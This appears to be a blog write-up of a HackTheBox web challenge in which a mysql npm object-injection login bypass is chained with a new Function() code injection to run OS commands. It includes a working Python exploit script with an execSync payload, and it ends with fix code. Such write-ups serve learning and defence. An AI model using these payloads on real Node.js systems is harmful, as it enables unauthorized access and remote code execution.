---
layout: post
title: "Spiky Tamagotchi"
date: 2027-07-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, cwe-94, cwe-943, new-function-injection, mysql-object-injection, auth-bypass, rce]
---

## Overview

Spiky Tamagotchi is an HTB Web challenge (Easy) with a Node.js + MySQL application. Two vulnerabilities chain to OS command execution: a MySQL `npm` package object-injection authentication bypass, then a `new Function()` code injection on the tamagotchi activity endpoint.

**[CWE-943](https://cwe.mitre.org/data/definitions/943.html) — ORM/Object-Query Injection · [CWE-94](https://cwe.mitre.org/data/definitions/94.html) — Code Injection**

---

## The Technique

### 1. MySQL npm object-injection auth bypass ([CWE-943](https://cwe.mitre.org/data/definitions/943.html))

The login query uses parameterized placeholders from the `mysql` (v2.x) npm package:

```javascript
let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
this.connection.query(stmt, [user, pass], callback);
```

The `mysql` package serializes object values passed to `?` placeholders as `key = 'value'` pairs. Sending `{"password": 1}` as the password:

```
WHERE username = 'admin' AND password = `password` = 1
```

`password = \`password\`` compares the column to itself — always `1` (true). `= 1` is satisfied. Authentication is bypassed for any known username without needing the real password.

### 2. `new Function()` template injection → RCE ([CWE-94](https://cwe.mitre.org/data/definitions/94.html))

The `/api/activity` endpoint passes the `activity` parameter verbatim into a template string, then evaluates it as a function body:

```javascript
let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
    if (a == 'feed') { ... } ... return {m, hp, w, hs}
    }`;
quickMaths = new Function(res);
const {m, hp, w, hs} = quickMaths();
```

`new Function(body)` is equivalent to `eval`. Injecting into `activity` breaks out of the string and executes arbitrary code.

**Injection structure detail:** the template has three lines. Using `} //` to close the injected block and comment out the rest of line 1 leaves line 3's `}` unmatched, causing a `SyntaxError`. The fix is to leave an unmatched `{` that absorbs line 3's `}`:

```
injection: ', hp=1, w=1, hs=1) { <evil code> } if(true) {//
```

Resulting function body:
```
with(a='', hp=1, w=1, hs=1) { <evil code> }  ← my block, complete
if(true) {                                      ← open block (line 1 remainder)
    // commented out ← never reached
    if (a == 'feed') { ... }                   ← line 2, inside if(true) block
}                                               ← line 3 closes if(true)
```

Inside `new Function` scope, `process.mainModule.require` is available for loading built-ins.

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"
s = requests.Session()

s.post(f"{BASE}/api/login", json={"username": "admin", "password": {"password": 1}})

rce = ("', hp=1, w=1, hs=1) { "
       "m=process.mainModule.require('child_process').execSync('cat /flag.txt').toString().trim();"
       "hp=1;w=1;hs=1; return {m,hp,w,hs} } if(true) {//")
r = s.post(f"{BASE}/api/activity",
           json={"activity": rce, "health": 1, "weight": 1, "happiness": 1})
m = re.search(r'HTB\{[^}]+\}', r.text)
if m:
    print(f"[+] FLAG: {m.group()}")
```

```bash
python3 solve.py <host> <port>
```

---

## Why it worked

**Auth bypass:** The `mysql` v2 package does not validate that placeholder values are primitives. An object `{password: 1}` is treated as a key-value map for a SET/WHERE clause, producing `\`password\` = 1` — a self-comparison that's always true. The `mysql2` package and actual prepared statements don't have this behavior.

**Code injection:** `new Function(string)` evaluates arbitrary JavaScript in the global scope. Any user-controlled data interpolated into that string is executable. The structure of the three-line template required specific care with braces to avoid a `SyntaxError` on the unmatched closing `}`.

---

## Fix

```javascript
// 1. Validate types before querying
if (typeof username !== 'string' || typeof password !== 'string') {
    return reject('Invalid input types');
}

// 2. Replace new Function() with a safe allowlist
const ALLOWED_ACTIVITIES = ['feed', 'play', 'sleep'];
if (!ALLOWED_ACTIVITIES.includes(activity)) throw new Error('invalid activity');
// Implement the logic directly in code, not via eval/new Function
```
